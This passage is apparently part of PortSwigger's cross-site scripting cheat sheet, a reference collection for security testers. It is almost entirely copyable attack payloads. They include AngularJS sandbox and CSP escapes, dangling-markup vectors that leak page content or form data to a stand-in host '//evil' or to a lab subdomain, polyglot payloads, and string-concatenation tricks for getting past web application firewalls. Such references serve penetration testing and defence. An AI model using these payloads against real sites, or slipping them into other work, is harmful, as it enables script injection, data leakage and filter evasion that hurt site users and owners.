x.view\"><div ng-if=\"key == 'window'\">{{ [1].reduce(value.alert, 1); }}</div></div></div>`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=1&version=1.4.5&x=%3Cdiv%20ng-app%20ng-csp%3E%3Cdiv%20ng-focus%3D%22x%3D%24event%3B%22%20id%3Df%20tabindex%3D0%3Efoo%3C%2Fdiv%3E%3Cdiv%20ng-repeat%3D%22%28key%2C%20value%29%20in%20x.view%22%3E%3Cdiv%20ng-if%3D%22key%20%3D%3D%20%27window%27%22%3E%7B%7B%20%5B1%5D.reduce%28value.alert%2C%201%29%3B%20%7D%7D%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E#f)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-1.2.0---1.5.0)\n\nAll versions (all browsers) shorter via oncut\n\n[Savan Gadhiya](https://twitter.com/gadhiyasavan) (NotSoSecure)\n\n59\n\n[`<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>`](https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=1&version=1.4.5&x=%3Cinput%20ng-cut%3D%24event.composedPath%28%29%7CorderBy%3A%27%28y%3Dalert%29%281%29%27%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-\\(all-browsers\\)-shorter-via-oncut)\n\nScriptless attacks\n------------------\n\n### Dangling markup\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nBackground attribute\n\n[``` <body background=\"//evil? <table background=\"//evil? <table><thead background=\"//evil? <table><tbody background=\"//evil? <table><tfoot background=\"//evil? <table><td background=\"//evil? <table><th background=\"//evil? ```](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%3E%3Cthead%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%3E%3Ctbody%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%3E%3Ctfoot%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%3E%3Ctd%20background%3D%22%2F%2Fevil%3F%0A%3Ctable%3E%3Cth%20background%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#background-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nLink href stylesheet\n\n[`<link rel=stylesheet href=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Clink%20rel%3Dstylesheet%20href%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#link-href-stylesheet)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nLink href icon\n\n[`<link rel=icon href=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Clink%20rel%3Dicon%20href%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#link-href-icon)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nMeta refresh\n\n[`<meta http-equiv=\"refresh\" content=\"0; http://evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20http%3A%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#meta-refresh)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nImg to pass markup through src attribute\n\n[``` <img src=\"//evil? <image src=\"//evil? ```](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3D%22%2F%2Fevil%3F%0A%3Cimage%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-to-pass-markup-through-src-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nVideo using track element\n\n[`<video><track default src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%3E%3Ctrack%20default%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#video-using-track-element)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nVideo using source element and src attribute\n\n[`<video><source src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%3E%3Csource%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#video-using-source-element-and-src-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAudio using source element and src attribute\n\n[`<audio><source src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%3E%3Csource%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#audio-using-source-element-and-src-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nInput src\n\n[`<input type=image src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20type%3Dimage%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#input-src)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nButton using formaction\n\n[`<form><button style=\"width:100%;height:100%\" type=submit formaction=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cbutton%20style%3D%22width%3A100%25%3Bheight%3A100%25%22%20type%3Dsubmit%20formaction%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#button-using-formaction)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nInput using formaction\n\n[`<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dsubmit%20value%3D%22XSS%22%20style%3D%22width%3A100%25%3Bheight%3A100%25%22%20type%3Dsubmit%20formaction%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#input-using-formaction)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nForm using action\n\n[`<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cbutton%20form%3Dx%20style%3D%22width%3A100%25%3Bheight%3A100%25%3B%22%3E%3Cform%20id%3Dx%20action%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#form-using-action)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nObject data\n\n[`<object data=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20data%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-data)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nIframe src\n\n[`<iframe src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-src)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nEmbed src\n\n[`<embed src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cembed%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#embed-src)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUse textarea to consume markup and post to external site\n\n[`<form><button formaction=//evil>XSS</button><textarea name=x>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cbutton%20formaction%3D%2F%2Fevil%3EXSS%3C%2Fbutton%3E%3Ctextarea%20name%3Dx%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#use-textarea-to-consume-markup-and-post-to-external-site)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPass markup data through window.name using form target\n\n[`<button form=x>XSS</button><form id=x action=//evil target='`](https://portswigger-labs.net/xss/xss.php?x=%3Cbutton%20form%3Dx%3EXSS%3C%2Fbutton%3E%3Cform%20id%3Dx%20action%3D%2F%2Fevil%20target%3D%27&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#pass-markup-data-through-windowname-using-form-target)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPass markup data through window.name using base target\n\n[`<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%3E%3Cfont%20size%3D100%20color%3Dred%3EYou%20must%20click%20me%3C%2Ffont%3E%3C%2Fa%3E%3Cbase%20target%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#pass-markup-data-through-windowname-using-base-target)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPass markup data through window.name using formtarget\n\n[`<form><input type=submit value=\"Click me\" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dsubmit%20value%3D%22Click%20me%22%20formaction%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20formtarget%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#pass-markup-data-through-windowname-using-formtarget)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing base href to pass data\n\n[`<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3Dabc%20style%3D%22width%3A100%25%3Bheight%3A100%25%3Bposition%3Aabsolute%3Bfont-size%3A1000px%3B%22%3Exss%3Cbase%20href%3D%22%2F%2Fevil%2F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-base-href-to-pass-data)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing embed window name to pass data from the page\n\n[`<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Cembed%20src%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-embed-window-name-to-pass-data-from-the-page)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing iframe window name to pass data from the page\n\n[`<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-iframe-window-name-to-pass-data-from-the-page)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing object window name to pass data from the page\n\n[`<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20data%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-object-window-name-to-pass-data-from-the-page)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing frame window name to pass data from the page\n\n[`<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"`](https://portswigger-labs.net/xss/xss.php?x=%3Cframeset%3E%3Cframe%20src%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-frame-window-name-to-pass-data-from-the-page)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nOverwrite type attribute with image in hidden inputs\n\n[`<input type=hidden type=image src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20type%3Dhidden%20type%3Dimage%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#overwrite-type-attribute-with-image-in-hidden-inputs)\n\nPolyglots\n---------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPolyglot payload 1\n\n[`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`](https://portswigger-labs.net/xss/xss.php?x=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%281%29%2F%2F%27%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglot-payload-1)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPolyglot payload 2\n\n[``` javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//> ```](https://portswigger-labs.net/xss/xss.php?x=javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml%20%5C%22%0A%20onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3Dalert%28%29%2F%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglot-payload-2)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nPolyglot payload 3\n\n[``javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>``](https://portswigger-labs.net/xss/xss.php?x=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Cdetails%2Fopen%2Fontoggle%3D%27%2B%2F%60%2F%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%28%2F%40PortSwiggerRes%2F%29%2F%2F%27%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglot-payload-3)\n\nWAF bypass global objects\n-------------------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (window)\n\n[`';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%27ale%27%2B%27rt%27%5D%28window%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (self)\n\n[`';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%27ale%27%2B%27rt%27%5D%28self%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (this)\n\n[`';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%27ale%27%2B%27rt%27%5D%28this%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (top)\n\n[`';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (parent)\n\n[`';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%27ale%27%2B%27rt%27%5D%28parent%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (frames)\n\n[`';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%27ale%27%2B%27rt%27%5D%28frames%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: string concatenation (globalThis)\n\n[`';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%27ale%27%2B%27rt%27%5D%28globalThis%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (window)\n\n[`';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28window%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (self)\n\n[`';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28self%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (this)\n\n[`';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28this%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in 